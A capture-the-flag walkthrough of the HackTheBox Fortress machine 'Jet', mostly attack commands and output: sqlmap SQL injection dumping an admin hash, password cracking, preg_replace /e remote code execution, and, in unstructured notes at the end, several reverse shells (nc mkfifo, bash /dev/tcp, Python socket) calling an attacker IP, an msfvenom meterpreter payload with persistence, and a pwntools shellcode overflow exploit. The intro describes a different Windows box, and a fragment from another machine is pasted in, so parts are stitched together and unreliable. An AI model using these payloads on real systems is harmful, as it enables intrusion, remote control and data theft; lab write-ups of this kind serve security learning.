---
title: "Walk-through of Jet from HackTHeBox"
header:
  teaser: /assets/images/2021-11-19-15-03-26.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - Linux
  - 
---

## Machine Information

![jet](/assets/images/2021-11-19-15-03-26.png)

Intelligence is a medium machine on HackTheBox. This is a Windows box hosting a DC and many other services. Our starting point is a web site and with some brute forcing we find many PDFs. Hidden amongst them we find credentials which we use to access an SMB share. From there we find a script that points us to a scheduled task that we take advantage of by pointing DNS to our attack machine. Using Responder we grab a users hash, which is easily cracked. Using these credentials we grab a service accounts hash, and with that we create a service ticket to impersonate the administrator. It sounds simple but this one took me way too long!

<!--more-->

Skills required are web and OS enumeration, plus an understanding of basic attack methods against Active Directory. Skills learned are many, including using CrackMapExec, SMBMap, LDAP searching, Responder, Impacket scripts and Kerberos ticket creation.

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu) |
| Link To Machine | [HTB - Fortress - Jet](https://www.hackthebox.com/home/careers/company/3) |
| Machine Release Date | 2017 |
| Date I Completed It | 30th November 2021 |
| Distribution Used | Kali 2021.3 – [Release Info](https://www.kali.org/blog/kali-linux-2021-3-release/) |

## Fortress Access

Fortress boxes are slightly different to normal ones. First download the connection pack from [here](https://www.hackthebox.com/home/htb/access) and connect using that instead of your normal ovpn:

```sh
┌──(root💀kali)-[~/htb/jet]
└─# openvpn jet.ovpn   
2021-11-19 14:53:45 WARNING: Compression for receiving enabled. Compression has been used in the past to break encryption. Sent packets are not compressed unless "allow-compression yes" is also set.
2021-11-19 14:53:45 DEPRECATED OPTION: --cipher set to 'AES-128-CBC' but missing in --data-ciphers (AES-256-GCM:AES-128-GCM). Future OpenVPN version will ignore --cipher for cipher negotiations. Add 'AES-128-CBC' to --data-ciphers or change --cipher 'AES-128-CBC' to --data-ciphers-fallback 'AES-128-CBC' to silence this warning.
2021-11-19 14:53:45 OpenVPN 2.5.1 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] built on May 14 2021
2021-11-19 14:53:45 library versions: OpenSSL 1.1.1l  24 Aug 2021, LZO 2.10
2021-11-19 14:53:45 Outgoing Control Channel Authentication: Using 256 bit message hash 'SHA256' for HMAC authentication
2021-11-19 14:53:45 Incoming Control Channel Authentication: Using 256 bit message hash 'SHA256' for HMAC authentication
2021-11-19 14:53:45 TCP/UDP: Preserving recently used remote address: [AF_INET]185.77.152.54:1337
<SNIP>
```

## Initial Recon

As always let's start with Nmap:

```text
┌──(root💀kali)-[~/htb/jet]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.13.37.10 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) 

┌──(root💀kali)-[~/htb/jet]
└─# nmap -p$ports -sC -sV -oA jet 10.13.37.10
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-19 14:56 GMT
Nmap scan report for securewebinc.jet (10.13.37.10)
Host is up (0.095s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 62:f6:49:80:81:cf:f0:07:0e:5a:ad:e9:8e:1f:2b:7c (RSA)
|   256 54:e2:7e:5a:1c:aa:9a:ab:65:ca:fa:39:28:bc:0a:43 (ECDSA)
|_  256 93:bc:37:b7:e0:08:ce:2d:03:99:01:0a:a9:df:da:cd (ED25519)
53/tcp    open  domain   ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp    open  http     nginx 1.10.3 (Ubuntu)
|_http-title: Welcome to nginx on Debian!
|_http-server-header: nginx/1.10.3 (Ubuntu)
5555/tcp  open  freeciv?
| fingerprint-strings: 
|   DNSVersionBindReqTCP, GenericLines, GetRequest, adbConnect: 
<SNIP>
7777/tcp  open  cbt?
| fingerprint-strings: 
|   Arucer, DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, Socks5, X11Probe: 
|     --==[[ Spiritual Memo ]]==--
|     Create a memo
|     Show memo
|     Delete memo
|     Can't you read mate?
|   NULL: 
|     --==[[ Spiritual Memo ]]==--
|     Create a memo
|     Show memo
|_    Delete memo
9201/tcp  open  http     BaseHTTPServer 0.3 (Python 2.7.12)
|_http-title: Site doesn't have a title (application/json).
60001/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP: 
|     Oops, I'm leaking! 0x7ffef3119840
<SNIP>
|   X11Probe: 
|_    Oops, I'm leaking! 0x7ffe0c30f9b0

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 176.56 seconds
```

The output from nmap is long, for now we'll concentrate on the website on port 80:

![jet-website-flag](/assets/images/2021-11-19-14-59-01.png)

First flag is nice and easy!

There's nothing else on the website, let's move on to port 53 and look at DNS. [This](https://book.hacktricks.xyz/pentesting/pentesting-dns) HackTricks article is really helpful.

```sh
┌──(root💀kali)-[~/htb/jet]
└─# dig @10.13.37.10 -x 10.13.37.10

; <<>> DiG 9.17.19-3-Debian <<>> @10.13.37.10 -x 10.13.37.10
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 9678
;; flags: qr aa rd; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;10.37.13.10.in-addr.arpa.      IN      PTR

;; AUTHORITY SECTION:
37.13.10.in-addr.arpa.  604800  IN      SOA     www.securewebinc.jet. securewebinc.jet. 3 604800 86400 2419200 604800

;; Query time: 104 msec
;; SERVER: 10.13.37.10#53(10.13.37.10) (UDP)
;; WHEN: Fri Nov 19 15:12:44 GMT 2021
;; MSG SIZE  rcvd: 109
```

We've found two domain names, let's add them:

```sh
┌──(root💀kali)-[~/htb/jet]
└─# echo "10.13.37.10 securewebinc.jet www.securewebinc.jet" >> /etc/hosts
```

Visiting the website using the domain name gives us a different site:

![jet-www-site](/assets/images/2021-11-19-15-21-30.png)

Scroll all the way down to the bottom for the second flag:

![jet-website-flag2](/assets/images/2021-11-19-15-22-14.png)

Looking at source code we find this:

```html
    <!-- Custom scripts for this template -->
    <script src="js/template.js"></script>
    <script src="js/secure.js"></script>
```

The file secure.js sounds interesting:

```js
eval(String.fromCharCode(102,117,110,99,116,105,111,110,32,103,101,116,83,116,97,116,115,40,41,10,123,10,32,32,32,32,36,46,97,106,97,120,40,123,117,114,108,58,32,34,47,100,105,114,98,95,115,97,102,101,95,100,105,114,95,114,102,57,69,109,99,69,73,120,47,97,100,109,105,110,47,115,116,97,116,115,46,112,104,112,34,44,10,10,32,32,32,32,32,32,32,32,115,117,99,99,101,115,115,58,32,102,117,110,99,116,105,111,110,40,114,101,115,117,108,116,41,123,10,32,32,32,32,32,32,32,32,36,40,39,35,97,116,116,97,99,107,115,39,41,46,104,116,109,108,40,114,101,115,117,108,116,41,10,32,32,32,32,125,44,10,32,32,32,32,101,114,114,111,114,58,32,102,117,110,99,116,105,111,110,40,114,101,115,117,108,116,41,123,10,32,32,32,32,32,32,32,32,32,99,111,110,115,111,108,101,46,108,111,103,40,114,101,115,117,108,116,41,59,10,32,32,32,32,125,125,41,59,10,125,10,103,101,116,83,116,97,116,115,40,41,59,10,115,101,116,73,110,116,101,114,118,97,108,40,102,117,110,99,116,105,111,110,40,41,123,32,103,101,116,83,116,97,116,115,40,41,59,32,125,44,32,49,48,48,48,48,41,59));
```

We can decode that Javascript string to see what it is. [This](https://www.educative.io/edpresso/what-is-stringfromcharcode-in-js) site has an explanation of the function and a box we can paste in to and click run:

![jet-string-from-code](/assets/images/2021-11-19-15-35-38.png)

Copying the result out we see we have a function:

```js
function getStats()
{
    $.ajax({url: "/dirb_safe_dir_rf9EmcEIx/admin/stats.php",

        success: function(result){
        $('#attacks').html(result)
    },
    error: function(result){
         console.log(result);
    }});
}
getStats();
setInterval(function(){ getStats(); }, 10000);
```

We see a URL to have a look at:

```sh
┌──(root💀kali)-[~/htb/jet]
└─# curl http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/stats.php
1637337254
```

Not very helpful for now. If we try without stats.php on the end we find there's a login page:

```sh
┌──(root💀kali)-[~/htb/jet]
└─# curl -v http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/
*   Trying 10.13.37.10:80...
* Connected to www.securewebinc.jet (10.13.37.10) port 80 (#0)
> GET /dirb_safe_dir_rf9EmcEIx/admin/ HTTP/1.1
> Host: www.securewebinc.jet
> User-Agent: curl/7.79.1
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 302 Moved Temporarily
< Server: nginx/1.10.3 (Ubuntu)
< Date: Fri, 19 Nov 2021 15:55:45 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< Location: login.php
< 
* Connection #0 to host www.securewebinc.jet left intact
```

We can curl that page and find another flag:

```sh
┌──(root💀kali)-[~/htb/jet]
└─# curl -s http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/login.php | grep JET
    <!-- JET{s3cur3_js_w4s_not_s0_s3cur3_4ft3r4ll} -->
```

Next we move on to SQL injections as this login page is vulnerable. Start Burp, attempt to log in on the website and capture:

![jet-burp](/assets/images/2021-11-19-16-04-45.png)

Save that to a file then use with sqlmap:

```sh
┌──(root💀kali)-[~/htb/jet]
└─# sqlmap -r jet-login --dbs
        ___
       __H__                                                                                                                                                                                                                                 
 ___ ___[']_____ ___ ___  {1.5.11#stable}                                                                                                                                                                                                    
|_ -| . [.]     | .'| . |                                                                                                                                                                                                                    
|___|_  [']_|_|_|__,|  _|                                                                                                                                                                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                 
[*] starting @ 15:56:26 /2021-11-19/
[15:56:26] [INFO] parsing HTTP request from 'jet-login'
[15:56:26] [INFO] resuming back-end DBMS 'mysql' 
[15:56:26] [INFO] testing connection to the target URL
got a 302 redirect to 'http://www.securewebinc.jet:80/dirb_safe_dir_rf9EmcEIx/admin/login.php'. Do you want to follow? [Y/n] 
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] 
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=tdAj'||(SELECT 0x454a5449 WHERE 4120=4120 AND (SELECT 9153 FROM(SELECT COUNT(*),CONCAT(0x71627a6a71,(SELECT (ELT(9153=9153,1))),0x7176627071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'&password=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=tdAj'||(SELECT 0x626a7765 WHERE 9743=9743 AND (SELECT 3364 FROM (SELECT(SLEEP(5)))yqgd))||'&password=
---
[15:56:28] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.10.3
back-end DBMS: MySQL >= 5.0
[15:56:28] [INFO] fetching database names
[15:56:28] [INFO] retrieved: 'information_schema'
[15:56:28] [INFO] retrieved: 'jetadmin'
available databases [2]:
[*] information_schema
[*] jetadmin
```

We see there is a database is called jetadmin, let's get it's tables:

```sh
┌──(root💀kali)-[~/htb/jet]
└─# sqlmap -r jet-login -D jetadmin --tables                                                                                                                                                                                             2 ⨯
        ___
       __H__                                                                                                                                                                                                                                 
 ___ ___[(]_____ ___ ___  {1.5.11#stable}                                                                                                                                                                                                    
|_ -| . [.]     | .'| . |                                                                                                                                                                                                                    
|___|_  [(]_|_|_|__,|  _|                                                                                                                                                                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                 
[*] starting @ 15:56:53 /2021-11-19/
[15:56:53] [INFO] parsing HTTP request from 'jet-login'
[15:56:53] [INFO] resuming back-end DBMS 'mysql' 
[15:56:53] [INFO] testing connection to the target URL
got a 302 redirect to 'http://www.securewebinc.jet:80/dirb_safe_dir_rf9EmcEIx/admin/login.php'. Do you want to follow? [Y/n] 
<SNIP>
[15:56:55] [INFO] fetching tables for database: 'jetadmin'
[15:56:55] [INFO] retrieved: 'users'
Database: jetadmin
[1 table]
+-------+
| users |
+-------+
```

Now let's dump the contents of the users table:

```sh
┌──(root💀kali)-[~/htb/jet]
└─# sqlmap -r jet-login -D jetadmin -T users --dump
        ___
       __H__                                                                                                                                                                                                                                 
 ___ ___[)]_____ ___ ___  {1.5.11#stable}                                                                                                                                                                                                    
|_ -| . [.]     | .'| . |                                                                                                                                                                                                                    
|___|_  [(]_|_|_|__,|  _|                                                                                                                                                                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                 
[*] starting @ 15:57:15 /2021-11-19/
[15:57:15] [INFO] parsing HTTP request from 'jet-login'
[15:57:15] [INFO] resuming back-end DBMS 'mysql' 
[15:57:15] [INFO] testing connection to the target URL
got a 302 redirect to 'http://www.securewebinc.jet:80/dirb_safe_dir_rf9EmcEIx/admin/login.php'. Do you want to follow? [Y/n] 
<SNIP>
[15:57:17] [INFO] fetching columns for table 'users' in database 'jetadmin'
[15:57:17] [INFO] retrieved: 'id'
[15:57:17] [INFO] retrieved: 'int(11)'
[15:57:17] [INFO] retrieved: 'username'
[15:57:17] [INFO] retrieved: 'varchar(50)'
[15:57:17] [INFO] retrieved: 'password'
[15:57:18] [INFO] retrieved: 'varchar(191)'
[15:57:18] [INFO] fetching entries for table 'users' in database 'jetadmin'
[15:57:18] [INFO] retrieved: '1'
[15:57:18] [INFO] retrieved: '97114847aa12500d04c0ef3aa6ca1dfd8fca7f156eeb864ab9b0445b235d5084'
[15:57:18] [INFO] retrieved: 'admin'
[15:57:18] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] 
do you want to crack them via a dictionary-based attack? [Y/n/q] 
[15:57:20] [INFO] using hash method 'sha256_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 
[15:57:34] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] 
[15:57:35] [INFO] starting dictionary-based cracking (sha256_generic_passwd)
[15:57:35] [INFO] starting 4 processes 
[15:57:46] [WARNING] no clear password(s) found                                                                                                                                                                                             
Database: jetadmin
Table: users
[1 entry]
+----+------------------------------------------------------------------+----------+
| id | password                                                         | username |
+----+------------------------------------------------------------------+----------+
| 1  | 97114847aa12500d04c0ef3aa6ca1dfd8fca7f156eeb864ab9b0445b235d5084 | admin    |
+----+------------------------------------------------------------------+----------+
```

We have the admin password hash, we can crack this with JohnTheRipper:

```sh
┌──(root💀kali)-[~/htb/jet]
└─# echo "97114847aa12500d04c0ef3aa6ca1dfd8fca7f156eeb864ab9b0445b235d5084" > jet-admin-hash
                                                                                                                                                                                                                                             
┌──(root💀kali)-[~/htb/jet]
└─# john --format=Raw-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt jet-admin-hash
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA256 [SHA256 256/256 AVX2 8x])
Warning: poor OpenMP scalability for this hash type, consider --fork=4
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Hackthesystem200 (?)     
1g 0:00:00:01 DONE (2021-11-19 15:58) 0.7692g/s 8570Kp/s 8570Kc/s 8570KC/s IloveBrandiLynn..Galgenwaard
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed.
```

Now we have the admin password we can login to the site:

![jet-dashboard](/assets/images/2021-11-19-16-17-26.png)

Down the bottom we have another flag:

![jet-flag4](/assets/images/2021-11-19-16-18-02.png)

Looking at email section there is a profanity filter:

![jet-email](/assets/images/2021-11-19-16-23-49.png)

Capture in Burp to see the preg_replace() function:

![jet-profanity](/assets/images/2021-11-19-16-25-23.png)

Send in Burp and we see this response:

```html
    <div class="login-box-body">
        <p class="login-box-msg">
            <i class="fa fa-warning text-warning"></i> <b>Warning:</b> Profanity filter is applied. Please check message before sending.
            <br>
        </p>
```

There is a remote code execution vulnerability with preg_replace(), change request in Burp:

```text
swearwords%5B%2Ffuck%2Fe%5D=system('ls')&swearwords%5B%2Fshit%2Fi%5D=poop&swearwords%5B%2Fass%2Fi%5D=behind&swearwords%5B%2Fdick%2Fi
%5D=penis&swearwords%5B%2Fwhore%2Fi%5D=escort&swearwords%5B%2Fasshole%2Fi%5D=bad+person&to=test%40pencer.com&subject=test&message=fuck
```

Key bit there is I've changed first swearword fuck to be replaced with system('ls'). So now when I send a message with fuck in it I get this response:

```html
<b>Message</b></p>
        <hr>
        <p>
            a_flag_is_here.txt
            auth.php
            badwords.txt
            bower_components
            build
            conf.php
            <SNIP>
    <br />
<b>
```

We can turn change it so we can run commands via a parameter variable:

```text
swearwords%5B%2Ffuck%2Fe%5D=system($_GET["cmd"])&swearwords%5B%2Fshit%2Fi%5D=poop&swearwords%5B%2Fass%2Fi%5D=behind&swearwords%5B%2Fdick%2Fi
%5D=penis&swearwords%5B%2Fwhore%2Fi%5D=escort&swearwords%5B%2Fasshole%2Fi%5D=bad+person&to=test%40pencer.com&subject=test&message=fuck
```

With the GET there we can use a parameter:

```text
POST /dirb_safe_dir_rf9EmcEIx/admin/email.php?cmd=cat a_flag_is_here.txt HTTP/1.1
```

The response contains the file with the flag:

```html
Message</b></p>
        <hr>
        <p>
        JET{pr3g_r3pl4c3_g3ts_y0u_pwn3d}
    <br />
    <b>
```

Time for a reverse shell:

```text
POST /dirb_safe_dir_rf9EmcEIx/admin/email.php?cmd=cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.13.14.46+1337+>/tmp/f HTTP/1.1
```

Send and switch to a waiting nc listener:

```sh
┌──(root💀kali)-[~/htb/jet]
└─# nc -nlvp 1337                            
listening on [any] 1337 ...
connect to [10.13.14.46] from (UNKNOWN) [10.13.37.10] 49554
/bin/sh: can't access tty; job control turned off
$
```

Move to the home folder to see a number of users:

```sh
$ ls -ls
total 36
 4 drwxrwx--- 2 alex          alex          4096 Jan  3  2018 alex
 4 drwxr-x--- 7 ch4p          ch4p          4096 Apr  1  2018 ch4p
 4 drwxr-x--- 6 g0blin        g0blin        4096 Apr  1  2018 g0blin
12 -rwsr-xr-x 1 alex          alex          9112 Dec 12  2017 leak
 4 drwxr-x--- 2 membermanager membermanager 4096 Dec 28  2017 membermanager
 4 drwxr-x--- 2 memo          memo          4096 Dec 28  2017 memo
 4 drwxr-xr-x 3 tony          tony          4096 Dec 28  2017 tony
```

Also a file called leak:

```sh
$ file leak
leak: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e423d25f1c41c318a8f5702f93b8e3f47273256a, not stripped
```

socat TCP4-LISTEN:60002,reuseaddr,fork EXEC:/home/leak


SH="exec%28%22%2Fbin%2Fbash%20%2Dc%20%27bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F10%2E13%2E14%2E46%2F4444%200%3E%261%27%22%29%3B"; curl -XPOST -sL "http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/email.php" -H "Cookie: PHPSESSID=dorlalvl59e6tafdednle95mb6" -d "swearwords%5B%2Fmessage%2Fe%5D=${SH}&swearwords%5B%2Fshit%2Fi%5D=poop&swearwords%5B%2Fass%2Fi%5D=behind&swearwords%5B%2Fdick%2Fi%5D=penis&swearwords%5B%2Fwhore%2Fi%5D=escort&swearwords%5B%2Fasshole%2Fi%5D=bad+person&to=admin%40securewebinc.jet&subject=subject&message=%3Cp%3Emessage%3C%2Fp%3E&_wysihtml5_mode=1" -o /dev/null

SH="exec%28%22%2Fbin%2Fbash%20%2Dc%20%27bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F10%2E13%2E14%2E46%2F4443%200%3E%261%27%22%29%3B"; curl -XPOST -sL "http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/email.php" -H "Cookie: PHPSESSID=dorlalvl59e6tafdednle95mb6" -d "swearwords%5B%2Fmessage%2Fe%5D=${SH}&swearwords%5B%2Fshit%2Fi%5D=poop&swearwords%5B%2Fass%2Fi%5D=behind&swearwords%5B%2Fdick%2Fi%5D=penis&swearwords%5B%2Fwhore%2Fi%5D=escort&swearwords%5B%2Fasshole%2Fi%5D=bad+person&to=admin%40securewebinc.jet&subject=subject&message=%3Cp%3Emessage%3C%2Fp%3E&_wysihtml5_mode=1" -o /dev/null

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.13.14.46 LPORT=4445 -f elf -o pwn
msfconsole -nqx "use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set LHOST 10.13.14.46; set LPORT 4445; set ExitOnSession false; exploit -jz"
meterpreter> run persistence -U -i 3 -r 10.13.14.46 -p pwn

PHPSESSID=$(curl -XPOST -sL "http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/dologin.php" -d "username=admin&password=Hackthesystem200" -o /dev/null -D - | fgrep "Set-Cookie:" | head -1 | perl -ne 'print $1 if m?PHPSESSID=([0-9a-z]{26});?'); IP="10%2e13%2e14%2e46"; PORT=4444; SH="exec%28%22%2Fbin%2Fbash%20%2Dc%20%27bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F${IP}%2F${PORT}%200%3E%261%27%22%29%3B"; curl -XPOST -sL "http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/email.php" -H "Cookie: PHPSESSID=${PHPSESSID}" -d "swearwords%5B%2Fmessage%2Fe%5D=${SH}&swearwords%5B%2Fshit%2Fi%5D=poop&swearwords%5B%2Fass%2Fi%5D=behind&swearwords%5B%2Fdick%2Fi%5D=penis&swearwords%5B%2Fwhore%2Fi%5D=escort&swearwords%5B%2Fasshole%2Fi%5D=bad+person&to=admin%40securewebinc.jet&subject=subject&message=%3Cp%3Emessage%3C%2Fp%3E&_wysihtml5_mode=1" -o /dev/null

```
$PHPSESSID=$(curl-XPOST-sL"http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/dologin.php"-d"username=admin&password=Hackthesystem200"-o/dev/null-D-|fgrep"Set-Cookie:"|head-1|perl-ne'print$1ifm?PHPSESSID=([0-9a-z]{26});?');IP="10.13.14.8";PORT=4444;SH="exec("/bin/bash -c 'bash -i >& /dev/tcp/${IP}/${PORT} 0>&1'");";curl-XPOST-sL"http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/email.php"-H"Cookie:PHPSESSID=${PHPSESSID}"-d"swearwords[/message/e]=${SH}&swearwords[/shit/i]=poop&swearwords[/ass/i]=behind&swearwords[/dick/i]=penis&swearwords[/whore/i]=escort&swearwords[/asshole/i]=bad+person&to=admin@securewebinc.jet&subject=subject&message=<p>message</p>&_wysihtml5_mode=1"-o/dev/null
```



python3 -c 'import pty;pty.spawn("/bin/bash")'
dasith@secret:~/local-web$ ^Z
zsh: suspended  nc -lvvp 1337
┌──(root💀kali)-[~/htb/secret]
└─# stty raw -echo; fg



python -c "import pty; pty.spawn(\"/bin/bash\");"
export TERM=linux; export TERMINFO=/etc/terminfo

python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.13.14.46\",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);"


┌──(root💀kali)-[~/htb/jet]
└─# cat sploit.py       
from pwn import *
p=remote('10.13.37.10',60002)
p.recvuntil("Oops, I'm leaking! ")
leak=int(p.recvuntil("\n"),16)
print (hex(leak))
p.recvuntil("> ")
shellcode=b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
buf=shellcode
buf+=b"\x90"*(72-len(shellcode))
buf+=p64(leak, endian="little")
p.sendline(buf)
p.interactive()
